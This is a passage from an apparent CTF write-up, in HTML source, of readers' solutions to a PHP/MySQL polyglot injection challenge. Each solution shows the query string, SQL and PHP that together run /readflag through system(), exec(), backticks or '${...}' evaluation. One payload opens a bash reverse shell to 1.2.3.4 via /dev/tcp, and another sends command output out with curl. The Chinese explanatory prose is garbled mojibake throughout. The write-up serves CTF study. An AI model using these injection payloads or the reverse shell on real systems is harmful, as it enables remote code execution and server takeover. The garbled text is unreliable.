çµ„æˆï¼Œä¸­é–“è¢«åŒ…å¤¾çš„å­—ä¸²æ˜¯çœ‹ä¸è¦‹çš„ï¼Œä¸¦ä¸”æ”¯æ´æ›è¡Œï¼Œè€Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; åœ¨ PHP ä¹‹ä¸­å‰‡ä»£è¡¨éæ¸›é‹ç®—å­ï¼Œæ‰€ä»¥å¦‚ &lt;code class=&quot;highlighter-rouge&quot;&gt;$output --&lt;/code&gt; å­—ä¸²å…¶å¯¦æ˜¯åœ¨å° $output é€²è¡Œæ¸› 1 çš„æ“ä½œã€‚ç¶œåˆä¸Šé¢ç‰¹æ€§ï¼Œå°æ–¼ä¸Šé¢çš„è§£æ³•ï¼Œå…¶å¯¦åªæœ‰ PHP çœ‹è¦‹çš„ç¬¬ä¸‰è¡Œ ` ; system(â€˜/readflagâ€™);` æœƒèªç‚ºæ˜¯éœ€è¦åŸ·è¡Œçš„ç¨‹å¼ç¢¼ï¼Œå…¶é¤˜éƒ¨åˆ†ä¸è«–æ˜¯ SQL é‚„æ˜¯ PHP éƒ½ä»¥ç‚ºæ˜¯è¨»è§£çš„å­—ä¸²è€Œç„¡è¦–ï¼Œå› æ­¤å¯ä»¥é †åˆ©åŸ·è¡Œå–å¾— flagã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;amp;id=1

SQL: SELECT name /*! from mytable */ -- ; system(&quot;/readflag&quot;) FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;name /*! from mytable */ -- ; system(&quot;/readflag&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ­¤è§£æ³•ä¹Ÿæ˜¯åŒæ¨£é‹ç”¨è¨»è§£ï¼Œä½†ä½¿ç”¨çš„è¨»è§£ç¬¦è™Ÿä¼¼ä¹ç¨å¾®ç‰¹æ®Šï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;/* */&lt;/code&gt; é™¤äº† PHP ä¹‹å¤–ï¼ŒMySQL ä¹ŸåŒæ¨£æ”¯æ´æ­¤å…è¨±å¤šè¡Œçš„è¨»è§£ç¬¦è™Ÿï¼Œä½†å‡å¦‚å¤šä¸Šä¸€å€‹é©šå˜†è™Ÿ &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt;ï¼Œäº‹æƒ…å°±åˆç¨å¾®ä¸åŒäº†ï¼Œé€™æ˜¯ MySQL ç‰¹æœ‰çš„è®Šç¨®è¨»è§£ç¬¦è™Ÿï¼Œåœ¨æ­¤ç¬¦è™Ÿä¸­çš„å­—ä¸²ï¼Œä»ç„¶æœƒè¢« MySQL ç•¶æˆ SQL çš„ä¸€éƒ¨åˆ†åŸ·è¡Œï¼Œä½†åœ¨å…¶ä»– DBMS ä¹‹ä¸­ï¼Œå› ç‚ºæ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;/*&lt;/code&gt; é–‹é ­å°±æœƒèªç‚ºå®ƒå°±æ˜¯å–®ç´”çš„è¨»è§£æ–‡å­—è€Œå¿½è¦–ï¼Œè®“é–‹ç™¼äººå“¡èƒ½æ’°å¯«å¯ portable çš„ç¨‹å¼ç¢¼ã€‚å› æ­¤å°±èƒ½è£½é€ å‡ºä¸€ä¸²è¨»è§£æ–‡å­—å¯è¢« MySQL çœ‹è¦‹ä½†ç„¡æ³•è¢« PHP çœ‹è¦‹ï¼Œå¼·åˆ¶åœ¨è¨»è§£æ–‡å­—è£¡è®“ SQL æ§‹é€ åˆæ³•èªå¥ï¼Œå†åˆ©ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; è¨»è§£é–‰åˆæ‰€æœ‰å†—è´… SQL èªå¥ï¼Œç·Šæ¥è‘— &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; å¾Œå°±èƒ½æ’°å¯«ä»»æ„ PHP åŸ·è¡Œç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by FI:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&amp;gt;&amp;amp;id=1

SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt; FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒæ¨£æ˜¯åˆ©ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; è¨»è§£ç¬¦è™Ÿå¼·è¡Œæ§‹é€ åˆæ³•æŸ¥è©¢ï¼Œä¸éæœ‰è¶£çš„æ˜¯ï¼ŒMySQL æ”¯æ´ &lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; å–®è¡Œçš„è¨»è§£ç¬¦è™Ÿï¼Œæ­¤è¨»è§£ç¬¦è™ŸåŒæ¨£ä¹Ÿè¢« PHP æ”¯æ´ï¼Œæ‰€ä»¥ä¸æœƒå°è‡´ PHP èªæ³•éŒ¯èª¤ï¼Œæœ€å¾Œé‚„å¤šäº† &lt;code class=&quot;highlighter-rouge&quot;&gt;?&amp;gt;&lt;/code&gt; å¼·è¡ŒçµæŸ PHP ç¨‹å¼å€å¡Šï¼Œå†·çŸ¥è­˜æ˜¯å¦‚æœç¨‹å¼ç¢¼æ˜¯ PHP ç¨‹å¼å€å¡Šå…§æœ€å¾Œä¸€è¡Œçš„è©±ï¼Œä¸åŠ  &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; ä¸¦ä¸æœƒå°è‡´èªæ³•éŒ¯èª¤å”· :P&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by tree:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null--+.$output=exec(&#39;/readflag&#39;)&amp;amp;id=

SQL: SELECT null-- .$output=exec(&#39;/readflag&#39;) FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;null-- .$output=exec(&#39;/readflag&#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¹Ÿæ˜¯ç”¨äº† &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; æŠŠ PHP ç¨‹å¼ç¢¼çš„éƒ¨åˆ†åœ¨ SQL è£¡é¢é®è”½èµ·ä¾†ï¼Œåˆ©ç”¨äº† null é—œéµå­—è®“ SQL æŸ¥è©¢æœ‰å›å‚³çµæœï¼Œä½†åœ¨ PHP ä¹‹ä¸­å»è®Šæˆ &lt;code class=&quot;highlighter-rouge&quot;&gt;$row-&amp;gt;null&lt;/code&gt; å° $row ç‰©ä»¶å­˜å–åç‚º null çš„å±¬æ€§ï¼Œä½¿å¾— PHP ä¹Ÿèƒ½åˆæ³•åŸ·è¡Œï¼Œæœ€å¾Œå°‡æŒ‡ä»¤åŸ·è¡Œçµæœè¦†è“‹ $output è®Šæ•¸ï¼Œè®“é¡Œç›®å¹«åŠ©æˆ‘å€‘è¼¸å‡ºçµæœã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by cebrusfs (https://www.facebook.com/menghuan.yu):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;amp;id=1

SQL: SELECT column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;)) FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ­¤è§£æ³•ä¹Ÿæ˜¯é¡ä¼¼çš„æ€è·¯ï¼Œé‹ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; é–‰åˆå†æ¹Šå‡ºåˆæ³• PHP ç¨‹å¼ç¢¼ï¼Œæœ€å¾Œç›´æ¥ä½¿ç”¨ var_dump å¼·åˆ¶è¼¸å‡º exec çš„åŸ·è¡Œçµæœã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Jason3e7 (https://github.com/jason3e7):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;-- $id %2b system(&#39;/readflag&#39;);%23&amp;amp;id=1

SQL: SELECT NULL;-- $id + system(&#39;/readflag&#39;);# FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;NULL;-- $id + system(&#39;/readflag&#39;);#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™ä¹Ÿæ˜¯ç›¸ä¼¼çš„æ€è·¯ï¼Œæœ‰è¶£çš„æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; é€™å€‹éƒ¨åˆ†ï¼Œå¤§å®¶ä¸€å®šè¨˜å¾— &lt;code class=&quot;highlighter-rouge&quot;&gt;$id --&lt;/code&gt; æ˜¯éæ¸›é‹ç®—å­ï¼Œä½†æœ‰æ™‚å¯èƒ½æœƒå¿˜è¨˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; ä¹ŸåŒæ¨£æ˜¯éæ¸›é‹ç®—å­ï¼Œæ‰€ä»¥é€™å€‹ &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; æœƒä½¿å¾— MySQL èªç‚ºæ˜¯è¨»è§£ï¼ŒPHP å»ä»èªç‚ºæ˜¯éæ¸›é‹ç®—å­ä¸¦æ­£å¸¸åŸ·è¡Œä¸‹å»ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shoui:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&#39;/readflag&#39;).&quot;;&quot;;&amp;amp;id=1

SQL: SELECT null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&#39;/readflag&#39;).&quot;;&quot;; FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&#39;/readflag&#39;).&quot;;&quot;;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒæ¨£é‹ç”¨è¨»è§£ &lt;code class=&quot;highlighter-rouge&quot;&gt;--&lt;/code&gt; é–‰åˆ SQL ä½† PHP åˆæ˜¯éæ¸›é‹ç®—å­çš„ç‰¹æ€§ï¼Œè€Œ system åˆæœƒå°‡æŒ‡ä»¤åŸ·è¡Œçµæœç›´æ¥è¼¸å‡ºï¼Œå› æ­¤å°±èƒ½ç›´æ¥å–å¾— flagã€‚æœ¬äººæœ‰è£œå……èªªæ˜ç•¶æ™‚æ¸¬è©¦æ™‚ç›´æ¥è¤‡è£½è²¼ä¸ŠåŸå§‹ç¢¼é‚£è¡Œæ¥æ¸¬è©¦ï¼Œå¾Œä¾†ä½¿ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;?id=1&amp;amp;column=null-- -&quot;1&quot;;&quot; &quot;.system(&#39;/readflag&#39;).&quot;;&quot;&lt;/code&gt; ç²¾ç°¡å¾Œçš„ payload XDã€‚&lt;/p&gt;

&lt;h3 id=&quot;double-quoted-string-evaluation&quot;&gt;Double-quoted String Evaluation&lt;/h3&gt;

&lt;p&gt;PHP æœƒè‡ªå‹•åœ¨ç”±é›™å¼•è™Ÿã€Œâ€ã€åŒ…å¤¾çš„å­—ä¸²ä¸­ï¼Œå°‹æ‰¾ $ é–‹é ­çš„å­—è©ï¼Œå°‡å…¶è§£ææˆè®Šæ•¸å†æŠŠå€¼ä»£å…¥å­—ä¸²ä¸­ï¼Œé€™å€‹åŠŸèƒ½å°æ–¼å¿«é€Ÿè¼¸å‡ºå·²å……åˆ†è·³è„«è™•ç†çš„è®Šæ•¸å€¼éå¸¸æœ‰å¹«åŠ©ï¼Œå¯ä»¥å¢åŠ ç¨‹å¼ç¢¼å¯è®€æ€§ï¼›ä½†åŒæ¨£åœ°ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨é€™å€‹åŠŸèƒ½åšä¸€ä¸‹æœ‰è¶£çš„äº‹æƒ…ï¼Œä¾‹å¦‚é€™æ®µ PHP ç¨‹å¼ç¢¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;$str = &quot;${phpinfo()}&quot;;&lt;/code&gt; å°±å¯ä»¥ç›´æ¥åŸ·è¡Œ phpinfo å‡½å¼ï¼Œåˆ©ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;$str = &quot;${system(&#39;id&#39;)}&quot;;&lt;/code&gt; å°±å¯ä»¥åŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼›è€Œåœ¨ MySQL ä¸­ï¼Œé›™å¼•è™Ÿã€Œâ€ã€æ°å¥½ä¹Ÿå¯ä»¥è¢«ç”¨ä¾†è¡¨ç¤ºç´”å­—ä¸²ï¼Œæ‰€ä»¥æˆ‘å€‘å°±èƒ½æ§‹é€ å‡ºã€ŒMySQL èªç‚ºæ˜¯ç´”å­—ä¸²ï¼ŒPHP å»èªç‚ºéœ€è¦è§£æåŸ·è¡Œã€çš„ Payloadã€‚&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘å…ˆä¾†çœ‹ç¬¬ä¸€å€‹ä¾‹å­ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ginoah:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=&quot;${system(&#39;/readflag&#39;)}&quot;&amp;amp;id=1

SQL: SELECT id=&quot;${system(&#39;/readflag&#39;)}&quot; FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;id=&quot;${system(&#39;/readflag&#39;)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°æ–¼ SQL è€Œè¨€ï¼Œå°±æ˜¯å›å‚³ id èˆ‡å­—ä¸²æ¯”è¼ƒçš„çµæœï¼›ä½†å°æ–¼ PHP è€Œè¨€ï¼Œä¸Šè¿°çµæœæ˜¯å°‡é›™å¼•è™Ÿå­—ä¸²è§£æå®Œå¾Œæ‰è³¦å€¼çµ¦è®Šæ•¸ &lt;code class=&quot;highlighter-rouge&quot;&gt;$row-&amp;gt;id&lt;/code&gt;ï¼Œè€Œçµæœå°±å¦‚åŒå‰é¢èªªçš„ï¼Œå®ƒæœƒåŸ·è¡Œç³»çµ±æŒ‡ä»¤ /readflagï¼Œé‚„æœƒå°‡çµæœè¼¸å‡ºè‡³ç¶²é ï¼Œæ‰€ä»¥å°±èƒ½å–å¾— flagï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Billy (https://github.com/st424204):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%2b&quot;{$_POST[1]($_POST[2])}&quot;&amp;amp;id=1
POST: 1=system&amp;amp;2=/readflag

SQL: SELECT name+&quot;{$_POST[1]($_POST[2])}&quot; FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;name+&quot;{$_POST[1]($_POST[2])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒæ¨£åˆ©ç”¨é›™å¼•è™Ÿç‰¹æ€§ï¼Œä½†é€™å€‹ä¾‹å­æ§‹é€ çš„è¼ƒç‚ºè¤‡é›œï¼Œåˆ©ç”¨äº†ä¸€äº›é¬†è»Ÿç‰¹æ€§ï¼Œåœ¨ PHP ä¸­ï¼Œè‹¥å­—ä¸²è®Šæ•¸æ˜¯ä¸€å€‹å­˜åœ¨çš„å‡½å¼çš„åç¨±ï¼Œå‰‡æˆ‘å€‘å¯ä»¥åˆ©ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;$func = &#39;system&#39;; $func(&#39;id&#39;);&lt;/code&gt; é€™æ¨£çš„æ–¹å¼ä¾†å‘¼å«è©²è®Šæ•¸ï¼Œé€™å€‹ä¾‹å­å°±æ˜¯æ‡‰ç”¨äº†é€™å€‹ç‰¹æ€§ï¼Œå°‡æˆ‘å€‘å¾å‰ç«¯å‚³ééå»çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;$_POST[1]&lt;/code&gt; ç•¶æˆå‡½å¼åç¨±ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;$_POST[2]&lt;/code&gt; ä½œç‚ºå‡½å¼çš„åƒæ•¸åŸ·è¡Œï¼Œå› æ­¤åªè¦åƒæ•¸å†å¸¶ä¸Š &lt;code class=&quot;highlighter-rouge&quot;&gt;1=system&amp;amp;2=readflag&lt;/code&gt; å°±èƒ½å–å¾— flagï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Hans (https://hans00.me)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id||&quot;{$_POST[&#39;fn&#39;]($_POST[&#39;cmd&#39;])}&quot;&amp;amp;id=1
POST: fn=system&amp;amp;cmd=/readflag

SQL: SELECT id||&quot;{$_POST[&#39;fn&#39;]($_POST[&#39;cmd&#39;])}&quot; FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;id||&quot;{$_POST[&#39;fn&#39;]($_POST[&#39;cmd&#39;])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹ä¾‹å­èˆ‡å‰ä¸€å€‹åˆ©ç”¨äº†åŒæ¨£çš„ç‰¹æ€§ï¼Œå·®åˆ¥åœ¨èˆ‡æ­¤è™•çš„ Payload æ”¹ç”¨ OR é‚è¼¯é‹ç®—å­ &lt;code class=&quot;highlighter-rouge&quot;&gt;||&lt;/code&gt;ï¼Œè€Œå‰é¢ä½¿ç”¨çš„æ˜¯åŠ æ³•ç®—è¡“é‹ç®—å­ &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;ï¼Œä½†çµæœéƒ½æ˜¯ç›¸åŒçš„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Chris Lin (https://github.com/kulisu)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=TRUE/&quot;${system(%27/readflag%27)}&quot;;%23&amp;amp;id=1

SQL: SELECT TRUE/&quot;${system(&#39;/readflag&#39;)}&quot;;# FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;TRUE/&quot;${system(&#39;/readflag&#39;)}&quot;;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™ä¹Ÿæ˜¯ç”¨ç›¸åŒæ¦‚å¿µï¼Œå‰é¢æ”¹ç”¨é™¤æ³•ç®—è¡“é‹ç®—å­ &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;ã€‚çœ‹å®Œè§£æ³•æ‰ç™¼ç¾æŠ•ç¨¿è€…æ˜¯åŒäº‹ï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201030/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;execution-operator&quot;&gt;Execution Operator&lt;/h3&gt;

&lt;p&gt;åœ¨ PHP ä¸­å­˜åœ¨çœ¾å¤šå‡½å¼å¯ä»¥åŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼Œå…¶ä¸­é‚„åŒ…æ‹¬ä¸€å€‹ç‰¹æ®Šçš„ &lt;a href=&quot;https://www.php.net/manual/en/language.operators.execution.php&quot;&gt;Execution Operator&lt;/a&gt;ï¼Œæ­¤é‹ç®—å­çš„å½¢å¼æ˜¯åˆ©ç”¨åå¼•è™Ÿã€Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;`&lt;/code&gt;ã€å°‡å­—ä¸²åŒ…å¤¾èµ·ä¾†ï¼Œé€™æ¨£è©²å­—ä¸²å°±æœƒè¢«ç•¶ä½œç³»çµ±æŒ‡ä»¤åŸ·è¡Œï¼Œå…¶å…§éƒ¨å¯¦éš›æ˜¯åŸ·è¡Œ shell_execï¼Œæ›´è²¼å¿ƒçš„äº‹æƒ…æ˜¯ï¼Œé€™å€‹é‹ç®—å­åŒæ¨£æ”¯æ´ Double-quoted String Evaluationï¼Œæ‰€ä»¥è‹¥æ˜¯ &lt;code class=&quot;highlighter-rouge&quot;&gt;$cmd = &#39;id&#39;; echo `$cmd`;&lt;/code&gt; é€™æ¨£çš„å½¢å¼ï¼ŒPHP å°±æœƒå…ˆè§£æ $cmd å¾—å‡º idï¼Œå†åŸ·è¡Œ id ç³»çµ±æŒ‡ä»¤ï¼›è€Œåœ¨ MySQL ä¹‹ä¸­ï¼Œåå¼•è™Ÿæ˜¯ç”¨ä¾†è¡¨ç¤ºä¸€å€‹ identifierï¼Œidentifier ç”¨ä¾†æŒ‡ç¤ºä¸€å€‹ç‰©ä»¶ï¼Œæœ€å¸¸è¦‹çš„æ˜¯è³‡æ–™è¡¨æˆ–æ˜¯è³‡æ–™æ¬„ï¼Œç•¶æˆ‘å€‘åŸ·è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT c FROM t&lt;/code&gt;ï¼Œå…¶ä¸­ c å’Œ t å°±æ˜¯ identifierï¼Œæ‰€ä»¥è‹¥æƒ³é  Execution Operator ä¾†åŸ·è¡ŒæŒ‡ä»¤ï¼Œå¯èƒ½é‚„å¿…é ˆåŒæ™‚è®“ identifier èƒ½å¤ è¢« MySQL è­˜åˆ¥æ‰è¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by dalun (https://www.nisra.net):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=`$_POST[1]`%23?&amp;gt;&amp;amp;id=%0a+from+(select+&#39;id&#39;,&#39;$_POST[1]&#39;)+as+a+--+
POST: 1=/readflag

SQL: SELECT id=`$_POST[1]`#?&amp;gt; FROM mytable WHERE id = &#39;
     from (select &#39;id&#39;,&#39;$_POST[1]&#39;) as a -- &#39;
PHP: $output = $row-&amp;gt;id=`$_POST[1]`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•ä¼¼ä¹æ˜¯å”¯ä¸€é¡˜æ„ä½¿ç”¨ id åƒæ•¸çš„ XDï¼åœ¨ column åƒæ•¸ç”¨è¨»è§£ç¬¦è™Ÿ &lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; é–‰åˆå¾ŒçºŒï¼Œåœ¨ id åƒæ•¸æ’å…¥æ›è¡Œç¬¦è™Ÿä¸¦æ§‹é€ ä¸€å€‹åˆæ³•çš„ SQLï¼Œé€éå­æŸ¥è©¢è£½é€ åˆæ³•çš„ identifierï¼Œæœ€å¾Œç”± PHP é€é execution operator åŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by HexRabbit (https://twitter.com/h3xr4bb1t):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name+or+@`bash+-c+&quot;bash+-i+&amp;gt;%26+/dev/tcp/1.2.3.4/80+0&amp;gt;%261&quot;`&amp;amp;id=1

SQL: SELECT name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;` FROM mytable WHERE id = &#39;1&#39;
PHP: $output = $row-&amp;gt;name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;`;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•æ ¸å¿ƒä¹Ÿæ˜¯é€é execution oeperator åŸ·è¡ŒæŒ‡ä»¤ï¼Œä¸éç”¨äº†ä¸€å€‹ç‰¹æ®Šçš„å­—å…ƒ &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;ã€‚åœ¨ MySQL ä¸­ï¼Œé€™ä»£è¡¨ user-defined variablesï¼Œå¾Œé¢çš„å­—ä¸²å‰‡ç‚ºè®Šæ•¸çš„åç¨±ï¼Œè€Œä¸”åç¨±å¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—å…ƒï¼Œåªè¦ä½¿ç”¨ identifier çš„ç¬¦è™Ÿ &lt;code class=&quot;highlighter-rouge&quot;&gt;`&lt;/code&gt; æŠŠå­—ä¸²åŒ…å¤¾èµ·ä¾†å³å¯ï¼Œè€Œå­˜å–ä¸å­˜åœ¨çš„è®Šæ•¸ä¸¦ä¸æœƒå°è‡´éŒ¯èª¤ï¼ŒMySQL åªæœƒå›å‚³ NULL çš„çµæœã€‚åœ¨ PHP ä¸­çš„è©±ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; ä»£è¡¨ &lt;a href=&quot;https://www.php.net/language.operators.errorcontrol&quot;&gt;error control operator&lt;/a&gt;ï¼Œå¯ä»¥æ”¾ç½®åœ¨è¡¨é”å¼å‰ï¼Œæœƒè®“ PHP å°‡æ­¤è¡¨é”å¼åŸ·è¡Œç”¢ç”Ÿçš„éŒ¯èª¤è¨Šæ¯å…¨éƒ¨å¿½ç•¥ï¼Œç”±æ–¼æ˜¯è¡¨é”å¼ï¼Œæ‰€ä»¥ä¹Ÿèƒ½é™„åŠ åœ¨ execution operator ä¹‹å‰ã€‚æœ€å¾Œé€™å€‹è§£æ³•å†ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt; é‚è¼¯é‹ç®—å­ï¼ˆMySQL èˆ‡ PHP çš†æ”¯æ´ä¸¦ä¸”æ„ç¾©ç›¸åŒï¼‰ä¸²æ¥å³å¯é”æˆåŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by cjiso1117 (https://twitter.com/cjiso)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;%23&amp;amp;id=qwe

SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;# FROM mytable WHERE id = &#39;qwe&#39;
PHP: $output = $row-&amp;gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

